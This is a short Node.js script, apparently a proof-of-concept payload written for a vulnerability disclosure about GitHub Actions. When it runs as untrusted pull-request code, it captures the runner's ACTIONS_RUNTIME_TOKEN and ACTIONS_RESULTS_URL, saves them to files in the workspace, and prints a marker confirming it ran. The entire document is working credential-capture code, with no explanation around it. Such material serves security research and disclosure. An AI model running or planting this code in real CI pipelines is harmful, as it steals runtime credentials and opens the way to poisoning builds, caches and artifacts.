const fs=require('fs'),path=require('path');
const directory=path.join(process.env.GITHUB_WORKSPACE,'.vdp-cap');
fs.mkdirSync(directory,{recursive:true,mode:0o700});
if(!process.env.ACTIONS_RUNTIME_TOKEN||!process.env.ACTIONS_RESULTS_URL)throw Error('missing runtime capability');
fs.writeFileSync(path.join(directory,'token'),process.env.ACTIONS_RUNTIME_TOKEN,{mode:0o600});
fs.writeFileSync(path.join(directory,'url'),process.env.ACTIONS_RESULTS_URL,{mode:0o600});
console.log('UNTRUSTED_PR_CODE_RAN_WITH_ZERO_GITHUB_TOKEN_PERMISSIONS');
